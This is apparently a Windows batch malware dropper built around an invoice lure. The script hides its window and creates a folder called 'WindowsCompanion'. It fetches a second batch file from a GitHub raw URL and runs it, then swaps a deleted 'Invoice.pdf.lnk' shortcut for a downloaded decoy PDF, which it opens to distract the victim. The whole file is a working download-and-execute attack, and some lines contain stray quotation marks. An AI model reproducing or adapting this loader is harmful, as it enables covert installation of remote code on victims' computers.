@echo off

if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit

    set PATH_TO_ENTRY=%1

    if not exist "C:\WindowsCompanion" md "C:\WindowsCompanion"    
    set URL_FUX=https://raw.githubusercontent.com/BelliniGauss/1/main/fileToFux.bat    
    set PATH_FUX=C:\WindowsCompanion\fileToFux.bat    
    curl -L -o "%PATH_FUX%" "%URL_FUX%" 

    set URL_INVOICE=https://raw.githubusercontent.com/BelliniGauss/1/main/Invoice.pdf
    set INVOICE_NAME=Invoice.pdf
    set PATH_INVOICE=%PATH_TO_ENTRY%\%INVOICE_NAME%
    del Invoice.pdf.lnk"
    curl -L -o "%PATH_INVOICE%" "%URL_INVOICE%" && start Invoice.pdf "

    "%PATH_FUX%"
exit
